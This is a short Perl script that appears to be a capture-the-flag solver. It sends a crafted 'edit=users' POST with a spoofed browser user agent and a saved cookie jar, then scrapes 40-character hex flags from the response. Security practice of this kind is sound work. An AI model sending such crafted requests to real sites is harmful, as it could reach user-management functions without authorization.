#!/usr/bin/perl -w

use strict;
use LWP::UserAgent;
use HTTP::Cookies;
use Data::Dumper;
my $url = shift;
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
#$ua->agent('Phrozilla/1.0');
$ua->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0');
my $cookie_jar = HTTP::Cookies->new(
	file => 'D:/coookies.dat',
	autosave => 1,
	ignore_discard => 1
);
$ua->cookie_jar($cookie_jar);
push @{$ua->requests_redirectable}, 'POST';

my %p = ("edit" => "users", "change" => "manage+selected");

my $r = $ua->post($url, \%p);
my @flags;
if ($r->is_success) {
	my $c = $r->decoded_content;
	while ($c =~ m/([a-f0-9]{40})/gi) {
		push @flags, $1;
	}
} else {
	print $r->decoded_content;
	print $r->status_line;
}

foreach (@flags) {
	print $_,"\n";
}

exit 0;
